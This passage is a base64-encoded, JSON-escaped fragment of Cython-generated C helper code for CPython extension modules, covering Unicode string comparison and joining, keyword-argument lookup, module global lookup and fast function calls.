ICAgICBkYXRhMiA9IF9fUHl4X1B5VW5pY29kZV9EQVRBKHMyKTtcbiAgICAgICAgaWYgKF9fUHl4X1B5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGExLCAwKSAhPSBfX1B5eF9QeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhMiwgMCkpIHtcbiAgICAgICAgICAgIGdvdG8gcmV0dXJuX25lO1xuICAgICAgICB9IGVsc2UgaWYgKGxlbmd0aCA9PSAxKSB7XG4gICAgICAgICAgICBnb3RvIHJldHVybl9lcTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGludCByZXN1bHQgPSBtZW1jbXAoZGF0YTEsIGRhdGEyLCAoc2l6ZV90KShsZW5ndGggKiBraW5kKSk7XG4gICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSkgPyAocmVzdWx0ID09IDApIDogKHJlc3VsdCAhPSAwKTtcbiAgICAgICAgfVxuICAgIH0gZWxzZSBpZiAoKHMxID09IFB5X05vbmUpICYgczJfaXNfdW5pY29kZSkge1xuICAgICAgICBnb3RvIHJldHVybl9uZTtcbiAgICB9IGVsc2UgaWYgKChzMiA9PSBQeV9Ob25lKSAmIHMxX2lzX3VuaWNvZGUpIHtcbiAgICAgICAgZ290byByZXR1cm5fbmU7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgaW50IHJlc3VsdDtcbiAgICAgICAgUHlPYmplY3QqIHB5X3Jlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKHMxLCBzMiwgZXF1YWxzKTtcbiAgICAgICAgaWYgKCFweV9yZXN1bHQpXG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShweV9yZXN1bHQpO1xuICAgICAgICBQeV9ERUNSRUYocHlfcmVzdWx0KTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG5yZXR1cm5fZXE6XG4gICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpO1xucmV0dXJuX25lOlxuICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTtcbiNlbmRpZlxufVxuXG5cbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9HZXRLd1ZhbHVlX0ZBU1RDQUxMKFB5T2JqZWN0ICprd25hbWVzLCBQeU9iamVjdCAqY29uc3QgKmt3dmFsdWVzLCBQeU9iamVjdCAqcylcbntcbiAgICBQeV9zc2l6ZV90IGksIG4gPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKGt3bmFtZXMpO1xuICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICBpZiAodW5saWtlbHkobiA9PSAtMSkpIHJldHVybiBOVUxMO1xuICAgICNlbmRpZlxuICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspXG4gICAge1xuICAgICAgICBQeU9iamVjdCAqbmFtZWkgPSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKGt3bmFtZXMsIGkpO1xuICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgaWYgKHVubGlrZWx5KCFuYW1laSkpIHJldHVybiBOVUxMO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgaWYgKHMgPT0gbmFtZWkpIHJldHVybiBrd3ZhbHVlc1tpXTtcbiAgICB9XG4gICAgZm9yIChpID0gMDsgaSA8IG47IGkrKylcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpuYW1laSA9IF9fUHl4X1B5VHVwbGVfR0VUX0lURU0oa3duYW1lcywgaSk7XG4gICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICAgICBpZiAodW5saWtlbHkoIW5hbWVpKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpbnQgZXEgPSBfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKHMsIG5hbWVpLCBQeV9FUSk7XG4gICAgICAgIGlmICh1bmxpa2VseShlcSAhPSAwKSkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGVxIDwgMCkpIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgcmV0dXJuIGt3dmFsdWVzW2ldO1xuICAgICAgICB9XG4gICAgfVxuICAgIHJldHVybiBOVUxMO1xufVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbkNZVEhPTl9VTlVTRUQgc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwoUHlPYmplY3QgKmt3bmFtZXMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMpIHtcbiAgICBQeV9zc2l6ZV90IGksIG5rd2FyZ3M7XG4gICAgUHlPYmplY3QgKmRpY3Q7XG4jaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgbmt3YXJncyA9IFB5VHVwbGVfU2l6ZShrd25hbWVzKTtcbiAgICBpZiAodW5saWtlbHkobmt3YXJncyA8IDApKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgbmt3YXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoa3duYW1lcyk7XG4jZW5kaWZcbiAgICBkaWN0ID0gUHlEaWN0X05ldygpO1xuICAgIGlmICh1bmxpa2VseSghZGljdCkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIGZvciAoaT0wOyBpPG5rd2FyZ3M7IGkrKykge1xuI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgIFB5T2JqZWN0ICprZXkgPSBQeVR1cGxlX0dldEl0ZW0oa3duYW1lcywgaSk7XG4gICAgICAgIGlmICgha2V5KSBnb3RvIGJhZDtcbiNlbHNlXG4gICAgICAgIFB5T2JqZWN0ICprZXkgPSBQeVR1cGxlX0dFVF9JVEVNKGt3bmFtZXMsIGkpO1xuI2VuZGlmXG4gICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbShkaWN0LCBrZXksIGt3dmFsdWVzW2ldKSA8IDApKVxuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgfVxuICAgIHJldHVybiBkaWN0O1xuYmFkOlxuICAgIFB5X0RFQ1JFRihkaWN0KTtcbiAgICByZXR1cm4gTlVMTDtcbn1cbiNlbmRpZlxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFBZX1VJTlQ2NF9UIF9fUHl4X2dldF90cF9kaWN0X3ZlcnNpb24oUHlPYmplY3QgKm9iaikge1xuICAgIFB5T2JqZWN0ICpkaWN0ID0gUHlfVFlQRShvYmopLT50cF9kaWN0O1xuICAgIHJldHVybiBsaWtlbHkoZGljdCkgPyBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpIDogMDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFBZX1VJTlQ2NF9UIF9fUHl4X2dldF9vYmplY3RfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopIHtcbiAgICBQeU9iamVjdCAqKmRpY3RwdHIgPSBOVUxMO1xuICAgIFB5X3NzaXplX3Qgb2Zmc2V0ID0gUHlfVFlQRShvYmopLT50cF9kaWN0b2Zmc2V0O1xuICAgIGlmIChvZmZzZXQpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgZGljdHB0ciA9IChsaWtlbHkob2Zmc2V0ID4gMCkpID8gKFB5T2JqZWN0ICoqKSAoKGNoYXIgKilvYmogKyBvZmZzZXQpIDogX1B5T2JqZWN0X0dldERpY3RQdHIob2JqKTtcbiNlbHNlXG4gICAgICAgIGRpY3RwdHIgPSBfUHlPYmplY3RfR2V0RGljdFB0cihvYmopO1xuI2VuZGlmXG4gICAgfVxuICAgIHJldHVybiAoZGljdHB0ciAmJiAqZGljdHB0cikgPyBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKCpkaWN0cHRyKSA6IDA7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfb2JqZWN0X2RpY3RfdmVyc2lvbl9tYXRjaGVzKFB5T2JqZWN0KiBvYmosIFBZX1VJTlQ2NF9UIHRwX2RpY3RfdmVyc2lvbiwgUFlfVUlOVDY0X1Qgb2JqX2RpY3RfdmVyc2lvbikge1xuICAgIFB5T2JqZWN0ICpkaWN0ID0gUHlfVFlQRShvYmopLT50cF9kaWN0O1xuICAgIGlmICh1bmxpa2VseSghZGljdCkgfHwgdW5saWtlbHkodHBfZGljdF92ZXJzaW9uICE9IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkpKVxuICAgICAgICByZXR1cm4gMDtcbiAgICByZXR1cm4gb2JqX2RpY3RfdmVyc2lvbiA9PSBfX1B5eF9nZXRfb2JqZWN0X2RpY3RfdmVyc2lvbihvYmopO1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OU1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShQeU9iamVjdCAqbmFtZSwgUFlfVUlOVDY0X1QgKmRpY3RfdmVyc2lvbiwgUHlPYmplY3QgKipkaWN0X2NhY2hlZF92YWx1ZSlcbiNlbHNlXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUpXG4jZW5kaWZcbntcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X20pKSB7XG4gICAgICAgIGlmICghUHlFcnJfT2NjdXJyZWQoKSlcbiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfTmFtZUVycm9yKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIHJlc3VsdCA9IFB5T2JqZWN0X0dldEF0dHIoX19weXhfbSwgbmFtZSk7XG4gICAgaWYgKGxpa2VseShyZXN1bHQpKSB7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgIFB5RXJyX0NsZWFyKCk7XG4jZWxpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyB8fCBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTXG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5RGljdF9HZXRJdGVtUmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIG5hbWUsICZyZXN1bHQpID09IC0xKSkgUHlFcnJfQ2xlYXIoKTtcbiAgICBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCByZXN1bHQsICpkaWN0X2NhY2hlZF92YWx1ZSwgKmRpY3RfdmVyc2lvbilcbiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4jZWxzZVxuICAgIHJlc3VsdCA9IF9QeURpY3RfR2V0SXRlbV9Lbm93bkhhc2goX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgbmFtZSwgKChQeUFTQ0lJT2JqZWN0ICopIG5hbWUpLT5oYXNoKTtcbiAgICBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCByZXN1bHQsICpkaWN0X2NhY2hlZF92YWx1ZSwgKmRpY3RfdmVyc2lvbilcbiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihyZXN1bHQpO1xuICAgIH1cbiAgICBQeUVycl9DbGVhcigpO1xuI2VuZGlmXG4gICAgcmV0dXJuIF9fUHl4X0dldEJ1aWx0aW5OYW1lKG5hbWUpO1xufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnLCBQeU9iamVjdCAqa3cpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIHRlcm5hcnlmdW5jIGNhbGwgPSBQeV9UWVBFKGZ1bmMpLT50cF9jYWxsO1xuICAgIGlmICh1bmxpa2VseSghY2FsbCkpXG4gICAgICAgIHJldHVybiBQeU9iamVjdF9DYWxsKGZ1bmMsIGFyZywga3cpO1xuICAgIGlmICh1bmxpa2VseShQeV9FbnRlclJlY3Vyc2l2ZUNhbGwoIiB3aGlsZSBjYWxsaW5nIGEgUHl0aG9uIG9iamVjdCIpKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgcmVzdWx0ID0gKCpjYWxsKShmdW5jLCBhcmcsIGt3KTtcbiAgICBQeV9MZWF2ZVJlY3Vyc2l2ZUNhbGwoKTtcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkgJiYgdW5saWtlbHkoIVB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhcbiAgICAgICAgICAgIFB5RXhjX1N5c3RlbUVycm9yLFxuICAgICAgICAgICAgIk5VTEwgcmVzdWx0IHdpdGhvdXQgZXJyb3IgaW4gUHlPYmplY3RfQ2FsbCIpO1xuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2VuZGlmXG5cblxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfSm9pbihQeU9iamVjdCoqIHZhbHVlcywgUHlfc3NpemVfdCB2YWx1ZV9jb3VudCwgUHlfc3NpemVfdCByZXN1bHRfdWxlbmd0aCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfVUNTNCBtYXhfY2hhcikge1xuI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBQeU9iamVjdCAqcmVzdWx0X3V2YWw7XG4gICAgaW50IHJlc3VsdF91a2luZCwga2luZF9zaGlmdDtcbiAgICBQeV9zc2l6ZV90IGksIGNoYXJfcG9zO1xuICAgIHZvaWQgKnJlc3VsdF91ZGF0YTtcbiAgICBpZiAobWF4X2NoYXIgPiAxMTE0MTExKSBtYXhfY2hhciA9IDExMTQxMTE7XG4gICAgcmVzdWx0X3V2YWwgPSBQeVVuaWNvZGVfTmV3KHJlc3VsdF91bGVuZ3RoLCBtYXhfY2hhcik7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHRfdXZhbCkpIHJldHVybiBOVUxMO1xuICAgIHJlc3VsdF91a2luZCA9IChtYXhfY2hhciA8PSAyNTUpID8gUHlVbmljb2RlXzFCWVRFX0tJTkQgOiAobWF4X2NoYXIgPD0gNjU1MzUpID8gUHlVbmljb2RlXzJCWVRFX0tJTkQgOiBQeVVuaWNvZGVfNEJZVEVfS0lORDtcbiAgICBraW5kX3NoaWZ0ID0gKHJlc3VsdF91a2luZCA9PSBQeVVuaWNvZGVfNEJZVEVfS0lORCkgPyAyIDogcmVzdWx0X3VraW5kIC0gMTtcbiAgICByZXN1bHRfdWRhdGEgPSBQeVVuaWNvZGVfREFUQShyZXN1bHRfdXZhbCk7XG4gICAgYXNzZXJ0KGtpbmRfc2hpZnQgPT0gMiB8fCBraW5kX3NoaWZ0ID09IDEgfHwga2luZF9zaGlmdCA9PSAwKTtcbiAgICBpZiAodW5saWtlbHkoKFBZX1NTSVpFX1RfTUFYID4+IGtpbmRfc2hpZnQpIC0gcmVzdWx0X3VsZW5ndGggPCAwKSlcbiAgICAgICAgZ290byBvdmVyZmxvdztcbiAgICBjaGFyX3BvcyA9IDA7XG4gICAgZm9yIChpPTA7IGkgPCB2YWx1ZV9jb3VudDsgaSsrKSB7XG4gICAgICAgIGludCB1a2luZDtcbiAgICAgICAgUHlfc3NpemVfdCB1bGVuZ3RoO1xuICAgICAgICB2b2lkICp1ZGF0YTtcbiAgICAgICAgUHlPYmplY3QgKnV2YWwgPSB2YWx1ZXNbaV07XG4gICAgICAgICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICBpZiAoX19QeXhfUHlVbmljb2RlX1JFQURZKHV2YWwpID09ICgtMSkpXG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIHVsZW5ndGggPSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSCh1dmFsKTtcbiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICBpZiAodW5saWtlbHkodWxlbmd0aCA8IDApKSBnb3RvIGJhZDtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGlmICh1bmxpa2VseSghdWxlbmd0aCkpXG4gICAgICAgICAgICBjb250aW51ZTtcbiAgICAgICAgaWYgKHVubGlrZWx5KChQWV9TU0laRV9UX01BWCA+PiBraW5kX3NoaWZ0KSAtIHVsZW5ndGggPCBjaGFyX3BvcykpXG4gICAgICAgICAgICBnb3RvIG92ZXJmbG93O1xuICAgICAgICB1a2luZCA9IF9fUHl4X1B5VW5pY29kZV9LSU5EKHV2YWwpO1xuICAgICAgICB1ZGF0YSA9IF9fUHl4X1B5VW5pY29kZV9EQVRBKHV2YWwpO1xuICAgICAgICBpZiAodWtpbmQgPT0gcmVzdWx0X3VraW5kKSB7XG4gICAgICAgICAgICBtZW1jcHkoKGNoYXIgKilyZXN1bHRfdWRhdGEgKyAoY2hhcl9wb3MgPDwga2luZF9zaGlmdCksIHVkYXRhLCAoc2l6ZV90KSAodWxlbmd0aCA8PCBraW5kX3NoaWZ0KSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5VW5pY29kZV9Db3B5Q2hhcmFjdGVycyhyZXN1bHRfdXZhbCwgY2hhcl9wb3MsIHV2YWwsIDAsIHVsZW5ndGgpIDwgMCkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IGRlZmluZWQoX1B5VW5pY29kZV9GYXN0Q29weUNoYXJhY3RlcnMpXG4gICAgICAgICAgICBfUHlVbmljb2RlX0Zhc3RDb3B5Q2hhcmFjdGVycyhyZXN1bHRfdXZhbCwgY2hhcl9wb3MsIHV2YWwsIDAsIHVsZW5ndGgpO1xuICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIFB5X3NzaXplX3QgajtcbiAgICAgICAgICAgIGZvciAoaj0wOyBqIDwgdWxlbmd0aDsgaisrKSB7XG4gICAgICAgICAgICAgICAgUHlfVUNTNCB1Y2hhciA9IF9fUHl4X1B5VW5pY29kZV9SRUFEKHVraW5kLCB1ZGF0YSwgaik7XG4gICAgICAgICAgICAgICAgX19QeXhfUHlVbmljb2RlX1dSSVRFKHJlc3VsdF91a2luZCwgcmVzdWx0X3VkYXRhLCBjaGFyX3BvcytqLCB1Y2hhcik7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgfVxuICAgICAgICBjaGFyX3BvcyArPSB1bGVuZ3RoO1xuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0X3V2YWw7XG5vdmVyZmxvdzpcbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwgImpvaW4oKSByZXN1bHQgaXMgdG9vIGxvbmcgZm9yIGEgUHl0aG9uIHN0cmluZyIpO1xuYmFkOlxuICAgIFB5X0RFQ1JFRihyZXN1bHRfdXZhbCk7XG4gICAgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgIFB5X3NzaXplX3QgaTtcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gTlVMTDtcbiAgICBQeU9iamVjdCAqdmFsdWVfdHVwbGUgPSBQeVR1cGxlX05ldyh2YWx1ZV9jb3VudCk7XG4gICAgaWYgKHVubGlrZWx5KCF2YWx1ZV90dXBsZSkpIHJldHVybiBOVUxMO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKG1heF9jaGFyKTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihyZXN1bHRfdWxlbmd0aCk7XG4gICAgZm9yIChpPTA7IGk8dmFsdWVfY291bnQ7IGkrKykge1xuICAgICAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTSh2YWx1ZV90dXBsZSwgaSwgdmFsdWVzW2ldKSAhPSAoMCkpIGdvdG8gYmFkO1xuICAgICAgICBQeV9JTkNSRUYodmFsdWVzW2ldKTtcbiAgICB9XG4gICAgcmVzdWx0ID0gUHlVbmljb2RlX0pvaW4oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSwgdmFsdWVfdHVwbGUpO1xuYmFkOlxuICAgIFB5X0RFQ1JFRih2YWx1ZV90dXBsZSk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbmRpZlxufVxuXG5cbiNpZiBDWVRIT05fRkFTVF9QWUNBTEwgJiYgIUNZVEhPTl9WRUNUT1JDQUxMXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KFB5Q29kZU9iamVjdCAqY28sIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmdsb2JhbHMpIHtcbiAgICBQeUZyYW1lT2JqZWN0ICpmO1xuICAgIFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDtcbiAgICBQeU9iamVjdCAqKmZhc3Rsb2NhbHM7XG4gICAgUHlfc3NpemVfdCBpO1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgYXNzZXJ0KGdsb2JhbHMgIT0gTlVMTCk7XG4gICAgXG4gICAgYXNzZXJ0KHRzdGF0ZSAhPSBOVUxMKTtcbiAgICBmID0gUHlGcmFtZV9OZXcodHN0YXRlLCBjbywgZ2xvYmFscywgTlVMTCk7XG4gICAgaWYgKGYgPT0gTlVMTCkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgZmFzdGxvY2FscyA9IF9fUHl4X1B5RnJhbWVfR2V0TG9jYWxzcGx1cyhmKTtcbiAgICBmb3IgKGkgPSAwOyBpIDwgbmE7IGkrKykge1xuICAgICAgICBQeV9JTkNSRUYoKmFyZ3MpO1xuICAgICAgICBmYXN0bG9jYWxzW2ldID0gKmFyZ3MrKztcbiAgICB9XG4gICAgcmVzdWx0ID0gUHlFdmFsX0V2YWxGcmFtZUV4KGYsMCk7XG4gICAgKyt0c3RhdGUtPnJlY3Vyc2lvbl9kZXB0aDtcbiAgICBQeV9ERUNSRUYoZik7XG4gICAgLS10c3RhdGUtPnJlY3Vyc2lvbl9kZXB0aDtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBQeV9zc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3dhcmdzKSB7XG4gICAgUHlDb2RlT2JqZWN0ICpjbyA9IChQeUNvZGVPYmplY3QgKilQeUZ1bmN0aW9uX0dFVF9DT0RFKGZ1bmMpO1xuICAgIFB5T2JqZWN0ICpnbG9iYWxzID0gUHlGdW5jdGlvbl9HRVRfR0xPQkFMUyhmdW5jKTtcbiAgICBQeU9iamVjdCAqYXJnZGVmcyA9IFB5RnVuY3Rpb25fR0VUX0RFRkFVTFRTKGZ1bmMpO1xuICAgIFB5T2JqZWN0ICpjbG9zdXJlO1xuICAgIFB5T2JqZWN0ICprd2RlZnM7XG4gICAgUHlPYmplY3QgKmt3dHVwbGUsICoqaztcbiAgICBQeU9iamVjdCAqKmQ7XG4gICAgUHlfc3NpemVfdCBuZDtcbiAgICBQeV9zc2l6ZV90IG5rO1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgYXNzZXJ0KGt3YXJncyA9PSBOVUxMIHx8IFB5RGljdF9DaGVjayhrd2FyZ3MpKTtcbiAgICBuayA9IGt3YXJncyA/IFB5RGljdF9TaXplKGt3YXJncykgOiAwO1xuICAgIGlmICh1bmxpa2VseShQeV9FbnRlclJlY3Vyc2l2ZUNhbGwoIiB3aGlsZSBjYWxsaW5nIGEgUHl0aG9uIG9iamVjdCIpKSkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgaWYgKFxuICAgICAgICAgICAgY28tPmNvX2t3b25seWFyZ2NvdW50ID09IDAgJiZcbiAgICAgICAgICAgIGxpa2VseShrd2FyZ3MgPT0gTlVMTCB8fCBuayA9PSAwKSAmJlxuICAgICAgICAgICAgY28tPmNvX2ZsYWdzID09IChDT19PUFRJTUlaRUQgfCBDT19ORVdMT0NBTFMgfCBDT19OT0ZSRUUpKSB7XG4gICAgICAgIGlmIChhcmdkZWZzID09IE5VTEwgJiYgY28tPmNvX2FyZ2NvdW50ID09IG5hcmdzKSB7XG4gICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsTm9LdyhjbywgYXJncywgbmFyZ3MsIGdsb2JhbHMpO1xuICAgICAgICAgICAgZ290byBkb25lO1xuICAgICAgICB9XG4gICAgICAgIGVsc2UgaWYgKG5hcmdzID09IDAgJiYgYXJnZGVmcyAhPSBOVUxMXG4gICAgICAgICAgICAgICAgICYmIGNvLT5jb19hcmdjb3VudCA9PSBQeV9TSVpFKGFyZ2RlZnMpKSB7XG4gICAgICAgICAgICBcbiAgICAgICAgICAgIGFyZ3MgPSAmUHlUdXBsZV9HRVRfSVRFTShhcmdkZWZzLCAwKTtcbiAgICAgICAgICAgIHJlc3VsdCA9X19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbE5vS3coY28sIGFyZ3MsIFB5X1NJWkUoYXJnZGVmcyksIGdsb2JhbHMpO1xuICAgICAgICAgICAgZ290byBkb25lO1xuICAgICAgICB9XG4gICAgfVxuICAgIGlmIChrd2FyZ3MgIT0gTlVMTCkge1xuICAgICAgICBQeV9zc2l6ZV90IHBvcywgaTtcbiAgICAgICAga3d0dXBsZSA9IFB5VHVwbGVfTmV3KDIgKiBuayk7XG4gICAgICAgIGlmIChrd3R1cGxlID09IE5VTEwpIHtcbiAgICAgICAgICAgIHJlc3VsdCA9IE5VTEw7XG4gICAgICAgICAgICBnb3RvIGRvbmU7XG4gICAgICAgIH1cbiAgICAgICAgayA9ICZQeVR1cGxlX0dFVF9JVEVNKGt3dHVwbGUsIDApO1xuICAgICAgICBwb3MgPSBpID0gMDtcbiAgICAgICAgd2hpbGUgKFB5RGljdF9OZXh0KGt3YXJncywgJnBvcywgJmtbaV0sICZrW2krMV0pKSB7XG4gICAgICAgICAgICBQeV9JTkNSRUYoa1tpXSk7XG4gICAgICAgICAgICBQeV9JTkNSRUYoa1tpKzFdKTtcbiAgICAgICAgICAgIGkgKz0gMjtcbiAgICAgICAgfVxuICAgICAgICBuayA9IGkgLyAyO1xuICAgIH1cbiAgICBlbHNlIHtcbiAgICAgICAga3d0dXBsZSA9IE5VTEw7XG4gICAgICAgIGsgPSBOVUxMO1xuICAgIH1cbiAgICBjbG9zdXJlID0gUHlGdW5jdGlvbl9HRVRfQ0xPU1VSRShmdW5jKTtcbiAgICBrd2RlZnMgPSBQeUZ1bmN0aW9uX0dFVF9LV19ERUZBVUxUUyhmdW5jKTtcbiAgICBpZiAoYXJnZGVmcyAhPSBOVUxMKSB7XG4gICAgICAgIGQgPSAmUHlUdXBsZV9HRVRfSVRFTShhcmdkZWZzLCAwKTtcbiAgICAgICAgbmQgPSBQeV9TSVpFKGFyZ2RlZnMpO1xuICAgIH1cbiAgICBlbHNlIHtcbiAgICAgICAgZCA9IE5VTEw7XG4gICAgICAgIG5kID0gMDtcbiAgICB9XG4gICAgcmVzdWx0ID0gUHlFdmFsX0V2YWxDb2RlRXgoKFB5T2JqZWN0KiljbywgZ2xvYmFscywgKFB5T2JqZWN0ICopTlVMTCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcmdzLCAoaW50KW5hcmdzLFxuICAgICAgICAgI